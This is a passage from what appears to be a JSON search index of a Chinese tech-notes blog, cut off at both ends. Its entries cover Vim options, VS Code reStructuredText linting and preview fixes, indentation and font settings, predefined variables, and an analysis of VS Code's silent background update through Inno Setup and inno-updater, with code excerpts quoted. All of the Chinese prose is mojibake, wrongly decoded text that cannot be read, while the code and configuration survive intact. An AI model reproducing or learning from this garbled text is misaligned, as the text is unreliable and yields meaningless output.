‡ç‚¹ç¬¦å·ï¼‰ï¼Œæ‰å‘ç”ŸæŠ˜è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä¼šåœ¨å•è¯å†…éƒ¨æŠ˜è¡Œã€‚ set wrapmargin=2 # æŒ‡å®šæŠ˜è¡Œå¤„ä¸ç¼–è¾‘çª—å£çš„å³è¾¹ç¼˜ä¹‹é—´ç©ºå‡ºçš„å­—ç¬¦æ•°ã€‚ set scrolloff=5 # å‚ç›´æ»šåŠ¨æ—¶ï¼Œå…‰æ ‡è·ç¦»é¡¶éƒ¨/åº•éƒ¨çš„ä½ç½®ï¼ˆå•ä½ï¼šè¡Œï¼‰ set sidescrolloff=15 # æ°´å¹³æ»šåŠ¨æ—¶ï¼Œå…‰æ ‡è·ç¦»è¡Œé¦–æˆ–è¡Œå°¾çš„ä½ç½®ï¼ˆå•ä½ï¼šå­—ç¬¦ï¼‰ã€‚è¯¥é…ç½®åœ¨ä¸æŠ˜è¡Œæ—¶æ¯”è¾ƒæœ‰ç”¨ã€‚ set laststatus=2 # æ˜¯å¦æ˜¾ç¤ºçŠ¶æ€æ ã€‚0 è¡¨ç¤ºä¸æ˜¾ç¤ºï¼Œ1 è¡¨ç¤ºåªåœ¨å¤šçª—å£æ—¶æ˜¾ç¤ºï¼Œ2 è¡¨ç¤ºæ˜¾ç¤ºã€‚ set ruler # åœ¨çŠ¶æ€æ æ˜¾ç¤ºå…‰æ ‡çš„å½“å‰ä½ç½®ï¼ˆä½äºå“ªä¸€è¡Œå“ªä¸€åˆ—ï¼‰ã€‚ å‚è€ƒ:: Vim é…ç½®å…¥é—¨ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— è¯­æ³• å˜é‡ å˜é‡å®šä¹‰: let a=1 æ‰“å°: echo &a å‚è€ƒ:: VIM ä¸­æ–‡ç”¨æˆ·æ‰‹å†Œ: ç¼–å†™ Vim è„šæœ¬","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vim.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vim.html"},{"title":"è®°å½•vscodeä¸rståä½œé‡åˆ°çš„ä¸€äº›å‘","text":"è¯­æ³•æ£€æŸ¥ ä¸»è¦å°±æ˜¯è¯­æ³•æ£€æŸ¥çš„å‘ ç”¨åˆ°çš„æ‹“å±•å« restructuredtext , å†…ç½®äº† lint è¯­æ³•æ£€æŸ¥, åŒ…å«ä¸‰ç§ç±»å‹ rst-check rst-lint doc8 æç¤º ... æ’ä»¶å•†åº—æœ‰æç¤ºlintä½¿ç”¨çš„æ˜¯å¦ä¸€ä¸ªæ’ä»¶, æˆ‘æ²¡ç»†çœ‹, æœ‰å…´è¶£çš„è‡ªè¡Œäº†è§£å§ å…¶ä¸­, æ•° rst-lint é—®é¢˜æœ€å¤§, vscode åœ¨å¦å¤–çš„åœ°æ–¹å·²ç»æœ‰é…ç½®ä½¿ç”¨ sphinx æ£€æŸ¥, è¿™é‡Œæ‹“å±•ä½¿ç”¨çš„ rst-lint æ£€æŸ¥é»˜è®¤è²Œä¼¼æ˜¯ä½¿ç”¨çš„ docutils , å¯¼è‡´æ²¡é—®é¢˜çš„åœ°æ–¹, è€ç»™ä½ æ ‡æ³¢æµªçº¿, ä¸¥é‡å½±å“ä½“éªŒ. ä¾‹å¦‚: toctreeæ ‡è®°è¯­æ³•é”™è¯¯, å…¶å®æ²¡é—®é¢˜ æœ€åé…ç½®ä»¥ä¸‹è®¾ç½®è§£å†³ // ç¦ç”¨ rst-lint \"restructuredtext.linter.disabledLinters\" : [ \"rst-lint\" , ], // ä½¿ç”¨ sphinx é¢„è§ˆ \"restructuredtext.preview.name\" : \"sphinx\" , å‚è€ƒæ–‡æ¡£ restructuredtexté…ç½® restructuredtext-linterä»‹ç» restructuredtext-issues#386 æ³¨è§£ å½“æ—¶è¿˜åœ¨ restructuredtext-issues#386 è¯¢é—®äº†ä½œè€…, åé¢æ‰çœ‹åˆ°é‚®ä»¶è¢«å‘ŠçŸ¥ç¡®å®ä¼¼ä¹ linter çš„é—®é¢˜, ä½†ä¸æ˜¯ä»–ä»¬å¼€å‘çš„. ç„¶åé¡ºæ‰‹å…³é—­äº†æ­¤é—®é¢˜... æœ€å¼€å§‹çš„ç†è§£æ˜¯ restructuredtext é‡Œé›†æˆäº† linter , è®¾æƒ³ linter å¯ä»¥è¢« restructuredtext è‡ªåŠ¨è®¾ç½®, æ˜¯æˆ‘é”™äº†, è¿˜æ˜¯ç¦ç”¨å§.","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html"},{"title":"è®°å½•ä¸€æ¬¡vscodeäºrståä½œçš„å‘","text":"ç³»ç»Ÿ macos 13 vscode 1.73.1 python 3.9.10 èƒŒæ™¯ ä»Šæ—¥çœ‹åˆ°é‡ç«çš„rstæ–‡æ¡£ä»‹ç», å‘ç°ä½¿ç”¨äº†ä¸€æ ·çš„vscodeæ’ä»¶ reStructuredText . ä½†æ˜¯æˆ‘è¿™è¾¹å±…ç„¶æ²¡æœ‰é¢„è§ˆhtmlçš„æ•ˆæœ(æ— htmlæ ·å¼, åªæœ‰ç©ºç™½çš„æ–‡å­—ä¸æ™®é€šæ ·å¼). å¤„ç† ä¸€å¼€å§‹ä»¥ä¸ºæœ‰æ’ä»¶å†²çª, å»è‡ªå·±çš„å·²å®‰è£…æ’ä»¶çœ‹äº†ä¸€ä¸‹, å¸è½½äº†ä¸€äº›æ²¡ç”¨çš„æ’ä»¶, æ— æœ. äºæ˜¯ç½‘ä¸Šå†²æµª, æ— æœ . ä¹Ÿå»é¡¹ç›® release çœ‹äº†, è¯´æ˜äº†ä¸ªå¯‚å¯. æœ€åçœ‹äº†ä¸€çœ¼åˆ«äººä½¿ç”¨çš„ç‰ˆæœ¬, v155.0.0 , å»ä¸‹è½½äº†è¿™ä¸ªç‰ˆæœ¬çš„ç”¨, å±…ç„¶å°±å¥½äº†... äºæ˜¯, åˆè¯•äº†è¾ƒæ–°çš„å‡ ä¸ªç‰ˆæœ¬, æœ€å¼€å§‹æ˜¯ä¸è¡Œçš„, åé¢å¯èƒ½æ˜¯å®‰è£…äº†æ¨èçš„æ’ä»¶, æœ€åä½¿ç”¨æœ€æ–°ç‰ˆ v189.2.0 åˆå¯ä»¥äº† æš‚æ—¶ç¡®å®š, ç›¸å…³çš„æœ‰ä¸€ä¸ª esbonio çš„ pip åŒ…ä¸€å®šè¦æœ‰(vscodeæ’ä»¶ä¸ç”¨, å› ä¸ºæ–°ç‰ˆå·²å†…ç½®), å»çœ‹äº†å®˜ç½‘æ–‡æ¡£, ç¡®å®è¦ ( reStructuredText v171ä¹‹åçš„ç‰ˆæœ¬å·²ç»å†…ç½®äº†è¿™ä¸ªæ’ä»¶, æ‰€ä»¥å¯èƒ½å¯åŠ¨çš„æ—¶å€™ä¼šæœ‰ä¸€äº›bug...) (ç®€è€Œè¨€ä¹‹å°±æ˜¯æŸäº›é…ç½®å­˜åœ¨é—®é¢˜, é€šè¿‡é™çº§åä½¿ç”¨çš„æ—¶å€™è§¦å‘äº†æŸäº›æ­£ç¡®é…ç½®, å‡çº§åå°±æ­£å¸¸äº†) ç»“è¯­ å®˜ç½‘æ–‡æ¡£åˆä¸è¯´, é¡¹ç›®çš„ release ä»‹ç»ä¹Ÿæ²¡æ, å‘... æœ€ç»ˆè§£å†³ äººéƒ½å‚»äº†, çŸ¥é“ä»€ä¹ˆåŸå› äº†, æœ€æ–°ç‰ˆé»˜è®¤ä½¿ç”¨çš„æ˜¯ docutils æ‰€ä»¥ä¼šæœ‰è¿™ä¸ªé—®é¢˜, éœ€è¦æ‰‹åŠ¨åˆ‡æ¢é…ç½®ä¸€ä¸‹, ç‚¹å‡» vscode å·¦ä¸‹è§’è®¾ç½®å³å¯(æ‰“å¼€rstæ–‡ä»¶æ‰æœ‰) å¦å¤–, æœ‰ä¸€ä¸ª No module named rstcheck.__main__; 'rstcheck' is a package and cannot be directly executed æŠ¥é”™, éœ€è¦åœ¨ setting.json é‡Œæ·»åŠ é…ç½® \"restructuredtext.linter.rstcheck.executablePath\": \"rstcheck\" , è¯¦æƒ…è§ å®˜ç½‘issuse æ³¨è§£ ç›¸å…³çš„æœ‰ä¸€ä¸ª esbonio çš„ pip åŒ…, reStructuredText v171ä¹‹åçš„ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨ pipå®‰è£…çš„äº†(æ²¡æœ‰çš„éœ€è¦è£…)","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html"},{"title":"vscodeä¸åŒæ–‡ä»¶é…ç½®ä¸åŒç¼©è¿›","text":"Command + Shift + P æ‰“å¼€ç”¨æˆ·è®¾ç½®, å‚è€ƒä»¥ä¸‹è®¾ç½®: \"[restructuredtext]\": { // \"editor.detectIndentation\": false, \"editor.tabSize\": 2, \"editor.insertSpaces\": true, }, ä¸€å¼€å§‹ç”¨çš„ rst å’Œ reStructuredText éƒ½å¤±è´¥äº†. æœ€åå»setting.jsonè”æƒ³è¾“å…¥æ‰çŸ¥é“æ˜¯ restructuredtext (å°å†™)","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html"},{"title":"vscodeé¢„å®šä¹‰å˜é‡","text":"é¢„å®šä¹‰å˜é‡ æ”¯æŒä¸‹é¢çš„é¢„å®šä¹‰å˜é‡: ${workspaceFolder} å½“å‰å·¥ä½œç›®å½•(æ ¹ç›®å½•) ${workspaceFolderBasename} å½“å‰æ–‡ä»¶çš„çˆ¶ç›®å½• ${file} å½“å‰æ‰“å¼€çš„æ–‡ä»¶å(å®Œæ•´è·¯å¾„) ${relativeFile} å½“å‰æ ¹ç›®å½•åˆ°å½“å‰æ‰“å¼€æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„(åŒ…æ‹¬æ–‡ä»¶å) ${relativeFileDirname} å½“å‰æ ¹ç›®å½•åˆ°å½“å‰æ‰“å¼€æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„(ä¸åŒ…æ‹¬æ–‡ä»¶å) ${fileBasename} å½“å‰æ‰“å¼€çš„æ–‡ä»¶å(åŒ…æ‹¬æ‰©å±•å) ${fileBasenameNoExtension} å½“å‰æ‰“å¼€çš„æ–‡ä»¶å(ä¸åŒ…æ‹¬æ‰©å±•å) ${fileDirname} å½“å‰æ‰“å¼€æ–‡ä»¶çš„ç›®å½• ${fileExtname} å½“å‰æ‰“å¼€æ–‡ä»¶çš„æ‰©å±•å ${cwd} å¯åŠ¨æ—¶taskå·¥ä½œçš„ç›®å½• ${lineNumber} å½“å‰æ¿€æ´»æ–‡ä»¶æ‰€é€‰è¡Œ ${selectedText} å½“å‰æ¿€æ´»æ–‡ä»¶ä¸­æ‰€é€‰æ‹©çš„æ–‡æœ¬ ${execPath} vscodeæ‰§è¡Œæ–‡ä»¶æ‰€åœ¨çš„ç›®å½• ${defaultBuildTask} é»˜è®¤ç¼–è¯‘ä»»åŠ¡(build task)çš„åå­—","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html"},{"title":"vscodeè®¾ç½®ç­‰å®½å­—ä½“","text":"ç›®å‰åªæ‰¾åˆ°ä¸¤ç§å­—ä½“: Inconsolata Ubuntu Mono: Ubuntu_Mono Inconsolata æ¯”è¾ƒä¼˜é›…çš„ç­‰å®½å­—ä½“ï¼Œæ”¯æŒé«˜åˆ†è¾¨ç‡ï¼Œæ˜¯å¼€æºçš„ Google Fonts å­—ä½“. Inconsolata å­—ä½“ä¸‹è½½åœ°å€(éœ€è¦ç§‘å­¦ä¸Šç½‘): Inconsolata#standard-styles ç‚¹å‡»å³ä¸Šè§’çš„ä¸‹è½½å³å¯: ä¸‹è½½å¥½åæ‰“å¼€æ–‡ä»¶å¤¹, åŒå‡» ttf å³å¯å®‰è£…. vscodeä¸­å°† Editor: Font Familyè®¾ç½®ä¸ºInconsolata: æœ€å‰é¢åŠ ä¸Šå­—ä½“åç§°å³å¯. æˆ–è€…åœ¨ setting.json åŠ å…¥(å†…å®¹æ ¹æ®ç°æœ‰å­—ä½“) \"editor.fontFamily\": \"'Inconsolata', Menlo, Monaco, 'Courier New', monospace\" çœ‹èµ·æ¥æ˜¯æŒ‰ç…§é¡ºåºæ¥æ‰¾å­—ä½“çš„, æŸä¸ªå­—ç¬¦è¿™ä¸ªå­—ä½“æ²¡æœ‰å°±çœ‹ä¸‹ä¸ª. è‡ªå·±ä¸‹è½½çš„: ../../../../resources/tar/Inconsolata.tar.gz Ubuntu Mono UbuntuMonoçš„github é¡µé¢ ä¸‹è½½è¿™å››ä¸ªttfæ–‡ä»¶: Ubuntu Mono derivative Powerline Bold Italic.ttf Ubuntu Mono derivative Powerline Bold.ttf Ubuntu Mono derivative Powerline Italic.ttf Ubuntu Mono derivative Powerline.ttf vscodeå†…è®¾ç½®ä¸€ä¸‹å³å¯: 'Ubuntu Mono derivative Powerline'","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html"},{"title":"Vscode","text":"vscode vscodeè®¾ç½®ç­‰å®½å­—ä½“ vscodeä¸åŒæ–‡ä»¶é…ç½®ä¸åŒç¼©è¿› è®°å½•vscodeä¸rståä½œ è®°å½•ä¸€æ¬¡vscodeé…ç½®rstçš„å‘ Vscodeé¢„å®šä¹‰å˜é‡ å®ç°æ¢ç©¶: vscode-æœ¬åœ°å†å²è®°å½• vscodeåå°æ›´æ–°æ¢ç©¶ MacOSä¸‹è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ Shell Command => å®‰è£…åˆ°Path","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-index.html"},{"title":"vscodeåå°æ›´æ–°æ¢ç©¶","text":"å› ä¸ºæƒ³åƒvscodeä¸€æ ·å®ç°åº”ç”¨çš„åå°æ— æ„Ÿæ›´æ–°, æ‰€ä»¥cloneä¸‹æ¥vscodeæºç ç ”ç©¶äº†è¿™ä¸€éƒ¨åˆ†. å¯¹äºä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬, å®ç°çš„æ–¹å¼ä¸åŒ, è¿™é‡Œåªè®¨è®º windows ä¸ macos. linuxçœ‹ä»£ç è²Œä¼¼æ²¡æ”¯æŒ. å‰ç½® æºç :: microsoft/vscode vscode äº‹ä»¶, ç»„ä»¶ç­‰æ¦‚å¿µ, å¦‚æœè¦ä»‹ç»ä¼šå¯¼è‡´ç¯‡å¹…å¤ªå¤š, æ•…ç•¥è¿‡. å¦‚æœéœ€è¦è‡ªå·±æ„å»º, å›½å†…ç›®å‰åªçœ‹åˆ°è¿™ä¸€ç¯‡è¯´æ˜æ¸…æ¥šäº†: æ‰“åŒ…VSCodeæºç ä¸ºå®‰è£…ç¨‹åº , å…¶å®æºç ä»“åº“readmeä¹Ÿæœ‰æŒ‡å¼•, ä¸è¿‡ä¸æ˜¯å¾ˆæ˜æ˜¾. ç¬”è€…ä½¿ç”¨macos, æœ€å¼€å§‹ç›´æ¥runçš„æ—¶å€™æ²¡æˆåŠŸ, åé¢å°±æ²¡ç®¡è¿™ä¸ªç›´æ¥çœ‹ä»£ç , å†åé¢æ‰æ‰¾åˆ°è¦æ€ä¹ˆæ„å»º. æ›´æ–°æ¨¡å—çš„ä¸»è¦æºç éƒ½åœ¨ src/vs/platform/update yanque@yanquedembp vscode-code % tree src/vs/platform/update src/vs/platform/update â”œâ”€â”€ common â”‚ â”œâ”€â”€ update.config.contribution.ts â”‚ â”œâ”€â”€ update.ts â”‚ â””â”€â”€ updateIpc.ts â””â”€â”€ electron-main â”œâ”€â”€ abstractUpdateService.ts â”œâ”€â”€ updateService.darwin.ts â”œâ”€â”€ updateService.linux.ts â”œâ”€â”€ updateService.snap.ts â””â”€â”€ updateService.win32.ts 2 directories, 8 files å¯¹å¤–æä¾›çš„æ¥å£ä¸»è¦éƒ½æ”¾ common ç›®å½•ä¸‹. electron-main ç›®å½•ä¸‹æ˜¯å…·ä½“çš„å®ç°. åœ¨ electron-main ä¸‹, abstractUpdateService.ts å®šä¹‰äº†æŠ½è±¡æ¨¡ç‰ˆ, åé¢ä¸‰ä¸ªéƒ½æ˜¯ç»§æ‰¿æ­¤ç±». updateService.darwin.ts æ˜¯é’ˆå¯¹ macos çš„å®ç° updateService.linux.ts æ˜¯é’ˆå¯¹ linux çš„å®ç° updateService.win32.ts æ˜¯é’ˆå¯¹ windows çš„å®ç° abstractUpdateService ä¸‹ initialize() å®šä¹‰äº†ä¸€ä¸ªåŸºç¡€çš„åˆ¤æ–­æ›´æ–°é€»è¾‘, æ£€æŸ¥ç”¨æˆ·é…ç½®çš„ update.mode ä¸º manual è¡¨ç¤ºæ‰‹åŠ¨æ›´æ–°, é€€å‡ºæ‰§è¡Œ ä¸º start è¡¨ç¤ºä»…å¯åŠ¨æ—¶å€™æ£€æŸ¥ä¸€æ¬¡æ›´æ–°, é€€å‡ºæ‰§è¡Œ å…¶ä»–å€¼åˆ™å®šæ—¶æ£€æŸ¥æ›´æ–°. è®¾ç½®çš„æ˜¯æ¯30sæ£€æŸ¥ä¸€æ¬¡ æºç : if (updateMode === 'manual') { this.logService.info('update#ctor - manual checks only; automatic updates are disabled by user preference'); return; } if (updateMode === 'start') { this.logService.info('update#ctor - startup checks only; automatic updates are disabled by user preference'); // Check for updates only once after 30 seconds setTimeout(() => this.checkForUpdates(false), 30 * 1000); } else { // Start checking for updates after 30 seconds this.scheduleCheckForUpdates(30 * 1000).then(undefined, err => this.logService.error(err)); } ç»è¿‡å‡ å±‚è°ƒç”¨ååˆ°äº†æŠ½è±¡ç±»çš„ doCheckForUpdates() , æ­¤æŠ½è±¡æ–¹æ³•ç”±ä¸Šé¢æåˆ°çš„ updateService.darwin.ts ç­‰å…·ä½“å®ç°. windowsæ— æ„Ÿæ›´æ–° å®ç°æ–¹å¼ä¾èµ– inno setup , å®˜ç½‘æ–‡æ¡£: inno_setup_jrsoftware åªè¯´ç»“æœ, å¦‚æœæ”¯æŒå¿«é€Ÿæ›´æ–°, åˆ™è°ƒç”¨ build_process çš„ spawn æ‰§è¡Œç±»ä¼¼äºä»¥ä¸‹æŒ‡ä»¤: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon å…¶ä¸­ VSCodeUserSetup-x64-1.76.0.exe : æ˜¯ä¸‹è½½å¥½çš„å®‰è£…åŒ… /verysilent : è¡¨ç¤º å¼ºåˆ¶é™é»˜å®‰è£…ï¼Œä¸ç®¡æ˜¯å¦æŠ¥é”™ï¼Œéƒ½ä¸ä¼šæœ‰ä»»ä½•æç¤º /update : vscode è‡ªå®šä¹‰çš„å‚æ•°. è§ update /nocloseapplications : ä¸å…³é—­åº”ç”¨ç¨‹åº å…¶ä»–: å­—é¢æ„æ€, ä»»åŠ¡éƒ½å®šä¹‰åœ¨ä»“åº“ build/win32/code.iss ä¸‹çš„ [Tasks] éƒ¨åˆ†(è¿›æ­¤æ–‡ä»¶æœå°±çœ‹åˆ°äº†) æ³¨è§£ çœŸæ­£æ”¯æŒåå°æ›´æ–°çš„æ˜¯ verysilent ä¸ /update /update å¯ä»¥è¯´æ˜¯tsä»£ç  ä¸ iss å†…å®šä¹‰è„šæœ¬çš„ä¸€ä¸ªäº¤äº’. (è¿˜ç”¨äº†äº’æ–¥é”, ä¸è¿‡å…·ä½“å®ç°æˆ‘æ²¡çœ‹æ‡‚) è¯¦æƒ…è§: åå°æ›´æ–° æºç : const child = spawn(this.availableUpdate.packagePath, ['/verysilent', `/update=\"${this.availableUpdate.updateFilePath}\"`, '/nocloseapplications', '/mergetasks=runcode,!desktopicon,!quicklaunchicon'], { detached: true, stdio: ['ignore', 'ignore', 'ignore'], windowsVerbatimArguments: true }); child.once('exit', () => { this.availableUpdate = undefined; this.setState(State.Idle(getUpdateType())); }); è¿™é‡Œçš„å‚æ•°ä¸€èˆ¬éƒ½æ˜¯é€šç”¨çš„, é™¤äº† /update . è¿™ä¸€éƒ¨åˆ†æ¶‰åŠåˆ° innosetup çš„ iss é…ç½®æ–‡ä»¶å®šä¹‰, å¯å‚è€ƒ å®˜ç½‘æ–‡æ¡£: inno_setup_jrsoftware /update æ˜¯vscode ä½¿ç”¨ innosetup è‡ªå®šä¹‰çš„ä¸€ä¸ªå‚æ•°, æºç å¦‚ä¸‹: // VS Code will create a flag file before the update starts (/update=C:\\foo\\bar) // - if the file exists at this point, the user quit Code before the update finished, so don't start Code after update // - otherwise, the user has accepted to apply the update and Code should start function LockFileExists(): Boolean; begin Result := FileExists(ExpandConstant('{param:update}')) end; function ShouldRunAfterUpdate(): Boolean; begin if IsBackgroundUpdate() then Result := not LockFileExists() else Result := True; end; å¯åŠ¨éƒ¨åˆ†ä»£ç å¦‚ä¸‹: [Run] Filename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Tasks: runcode; Flags: nowait postinstall; Check: ShouldRunAfterUpdate Filename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Flags: nowait postinstall; Check: WizardNotSilent ç»“åˆä¸Šä¸€éƒ¨åˆ†, èƒ½çœ‹å‡º, å½“ ShouldRunAfterUpdate ä¸º true (ä¹Ÿå°±æ˜¯å®‰è£…ç¨‹åºåå°å¯åŠ¨é™é»˜å®‰è£…ä¸”å­˜åœ¨flagæ–‡ä»¶) æ—¶, å°†ä¼šåœ¨ç”¨æˆ·é€€å‡ºå‡ºç¨‹åºå, è‡ªåŠ¨æ‰“å¼€. Taskå®šä¹‰: [Tasks] // çœç•¥... Name: \"runcode\"; Description: \"{cm:RunAfter,{#NameShort}}\"; GroupDescription: \"{cm:Other}\"; Check: WizardSilent å¯ä»¥çœ‹åˆ°, tasks å®šä¹‰äº† runcode ç­‰ä»»åŠ¡, çœ‹èµ·æ¥æ˜¯æ‰§è¡Œä»€ä¹ˆ, ä¸è¿‡æ²¡æ‰¾åˆ°å…·ä½“å®ç°, å®˜ç½‘ä¹Ÿæ²¡æ‰¾åˆ°ç›¸å…³è¯´æ˜. åå°æ›´æ–° è¡¥å……, åé¢å†çœ‹äº†ä¸€ä¸‹, å‘ç°è¿™éƒ¨åˆ†ä¹‹å‰è®¤è¯†æœ‰é™, çœŸæ­£æ”¯æŒåå°æ›´æ–°çš„æ˜¯ verysilent ä¸ /update . è€Œå¯¹äºvscodeæ¥è¯´, çœŸæ­£æœ‰ç”¨çš„è¿˜æ˜¯ /update . ä¸ä½¿ç”¨æ­¤å‚æ•°æ—¶, åœ¨vscodeåœ¨å…è®¸çš„æ—¶å€™, æ‰§è¡Œ: VSCodeUserSetup-x64-1.76.0.exe /verysilent /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon ä¼šå¼¹å‡ºäº¤äº’ç•Œé¢æç¤ºå·²ç»å®‰è£…, ç„¶åè®©ä½ å…ˆé€€å‡º. åœ¨å®šä¹‰äº† /update=VSCodeUserSetup-x64-1.76.0.flag å, å®‰è£…è·¯å¾„å°†ä¸ä¼šå®‰è£…åœ¨åŸæ¥çš„ {app} ç›®å½•ä¸‹, è€Œæ˜¯æš‚æ—¶å…ˆå®‰è£…åˆ° {app}\\_ ä¸‹, æœ€åä¼šè§¦å‘ inno_updater.exe . inno_updater.exe æ˜¯å¾®è½¯è‡ªå·±åšçš„ä¸€ä¸ªæ›´æ–°å·¥å…·, æºç åœ°å€: microsoft/inno-updater è€Œåœ¨ iss é…ç½®çš„æºç å¦‚ä¸‹, ä»…çœ‹å…³é”®ä»£ç  é…ç½®å½“å­˜åœ¨flagæ–‡ä»¶æ—¶(å³ ä½¿ç”¨äº† /update ) // file éƒ¨åˆ† [Files] Source: \"*\"; Excludes: \"\\CodeSignSummary*.md,\\tools,\\tools\\*,\\appx,\\appx\\*,\\resources\\app\\product.json\"; DestDir: \"{code:GetDestDir}\"; Flags: ignoreversion recursesubdirs createallsubdirs Source: \"tools\\*\"; DestDir: \"{app}\\tools\"; Flags: ignoreversion Source: \"{#ProductJsonPath}\"; DestDir: \"{code:GetDestDir}\\resources\\app\"; Flags: ignoreversion // code éƒ¨åˆ† function GetDestDir(Value: string): string; begin if IsBackgroundUpdate() then Result := ExpandConstant('{app}\\_') else Result := ExpandConstant('{app}'); end; æ•ˆæœ åå°å®‰è£…åˆ° _ ç›®å½•ä¸‹ æ‰§è¡Œ inno_updater.exe procedure CurStepChanged(CurStep: TSetupStep); var UpdateResultCode: Integer; begin if IsBackgroundUpdate() and (CurStep = ssPostInstall) then begin CreateMutex('{#AppMutex}-ready'); while (CheckForMutexes('{#AppMutex}')) do begin Log('Application is still running, waiting'); Sleep(1000); end; // æ­¤å¤„æ‰§è¡Œ Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, UpdateResultCode); end; end; inno_updater æºç  å¯ä»¥å» microsoft/inno-updater cloneä¸‹æºç çœ‹ , åœ¨ src/main.rs fn _main(log: &slog::Logger, args: &Vec<String>) -> Result<(), Box<dyn error::Error>> { //çœç•¥éå…³é”®ä»£ç  let code_path = PathBuf::from(&args[1]); //çœç•¥éå…³é”®ä»£ç  update(log, &code_path, \"_\", silent == \"true\") } åœ¨ update å‡½æ•°å°±æŒ‡å®šäº†æ›´æ–°è·¯å¾„ä¸º \"_\" æœ€åæ˜¯é€šè¿‡åˆ é™¤æ–‡ä»¶, å¹¶é‡å‘½åçš„æ–¹å¼å¤„ç†: fn move_update( log: &slog::Logger, uninstdat_path: &Path, update_folder_name: &str, ) -> Result<(), Box<dyn error::Error>> { // çœç•¥éå…³é”®éƒ¨åˆ† // safely delete all current files delete_existing_version(log, root_path, update_folder_name)?; // move update to current for entry in fs::read_dir(&update_path)? { let entry = entry?; let entry_name = entry.file_name(); let entry_name = entry_name.to_str().ok_or(io::Error::new( io::ErrorKind::Other, \"Could not get entry name\", ))?; let mut target = PathBuf::from(root_path); target.push(entry_name); let msg = format!(\"Renaming: {:?}\", entry_name); util::retry( &msg, |attempt| { info!(log, \"Rename: {:?} (attempt {})\", entry_name, attempt); fs::rename(entry.path(), &target)?; Ok(()) }, None, )?; } // çœç•¥éå…³é”®éƒ¨åˆ† } å°†é™¤ _ tools unins* appx çš„ç›®å½•/æ–‡ä»¶å®Œå…¨åˆ é™¤, å†ä» _ ä¸‹é‡å‘½åè¿‡å». è²Œä¼¼è¿˜æœ‰ç‰ˆæœ¬æ£€æŸ¥çš„åœ¨vscodeæºç é‡Œé¢, æ²¡ç»†çœ‹. å¤šä¸ªè¿›ç¨‹åä½œ-äº’æ–¥é‡ æ›´æ–°è¡¥å……ä»¥ä¸‹äº’æ–¥é‡ç›¸å…³. æ›´æ–°è¿‡ç¨‹ä¸ç”Ÿå‘½å‘¨æœŸæœ‰ä¸¤ä¸ªäº’æ–¥é‡å‚ä¸: {#AppMutex} {#AppMutex}-ready å…¶ä¸­, ç¬¬ä¸€ä¸ª {#AppMutex} ä¸»è¦ç”¨äºç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶å€™çš„é‡Šæ”¾(å°±æ˜¯vscodeè¿›ç¨‹ç»“æŸæ—¶å€™çš„é‡Šæ”¾), ç„¶åæç¤ºæ›´æ–°ç¨‹åºå¯ä»¥å¯åŠ¨ inno_updater è¿›è¡Œæ›´æ–°. åˆ›å»º {#AppMutex} åŠé‡Šæ”¾éƒ¨åˆ†æºç : private async installMutex(): Promise<void> { const win32MutexName = this.productService.win32MutexName; if (isWindows && win32MutexName) { try { const WindowsMutex = await import('windows-mutex'); const mutex = new WindowsMutex.Mutex(win32MutexName); once(this.lifecycleMainService.onWillShutdown)(() => mutex.release()); } catch (error) { this.logService.error(error); } } } åˆ›å»º {#AppMutex}-ready æºç (è¿™ä¸ªæš‚æ—¶æ²¡çœ‹åˆ°æœ‰é‡Šæ”¾çš„æ“ä½œ): procedure CurStepChanged(CurStep: TSetupStep); var UpdateResultCode: Integer; begin if IsBackgroundUpdate() and (CurStep = ssPostInstall) then begin CreateMutex('{#AppMutex}-ready'); while (CheckForMutexes('{#AppMutex}')) do begin Log('Application is still running, waiting'); Sleep(1000); end; Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, 